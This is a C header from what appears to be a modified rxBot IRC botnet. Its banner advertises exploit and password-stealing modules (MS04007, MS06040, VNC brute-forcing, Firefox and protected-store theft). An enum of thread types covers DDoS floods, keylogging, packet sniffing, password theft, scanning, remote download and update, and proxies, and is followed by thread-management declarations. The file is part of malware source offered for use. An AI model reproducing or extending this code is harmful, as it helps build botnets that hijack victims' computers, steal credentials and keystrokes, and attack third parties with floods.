/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */
enum {
	MAIN_THREAD,	
	KILLER_THREAD,		
	IDENT_THREAD,	
	HTTP_THREAD,	
	TFTP_THREAD,	
	FTP_THREAD,		   
	RLOGIN_THREAD,	
	RCMD_THREAD,		
	SCAN_THREAD,	
	NTPASS_THREAD,	
	DDOS_THREAD,		
	SYN_THREAD,		
	TCP_THREAD,		
	ICMP_THREAD,		
	PING_THREAD,		
	UDP_THREAD,			
	REDIRECT_THREAD,
	SOCKS4_THREAD,
	SOCKS5_THREAD,
	DCC_THREAD,	
	DCCCHAT_THREAD,		
	VISIT_THREAD,		
	DOWNLOAD_THREAD,	
	UPDATE_THREAD,		
	CLONE_THREAD,	
	PSNIFF_THREAD,		
	SECURE_THREAD,	
	KEYLOG_THREAD,	
	FIND_THREAD,		
	LOG_THREAD,			
	PASS_THREAD,	
	PROC_THREAD,
	LIST_THREAD			
};
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct THREAD 
{
   char name[IRCLINE];
   int id; 
   int parent;
   DWORD pid;
   DWORD Type;
   SOCKET sock;
   SOCKET csock;
   HANDLE tHandle;
   char nick[MAXNICKLEN];

} THREAD;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct TLIST
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TLIST;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
int addthread(char *name, int id, SOCKET sock);
DWORD WINAPI ListThread(LPVOID param);
void listthreads(SOCKET sock, char *chan, BOOL notice, BOOL full=FALSE);
BOOL killthread(int threadnum);
int killthreadall(void);
int killthreadid(int threadid, int threadnum=0);
int findthreadid(int threadid);
int findthreadnum(int threadid);
void stopthread(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread);
void clearthread(int threadnum);
int CheckThread(DWORD Type);


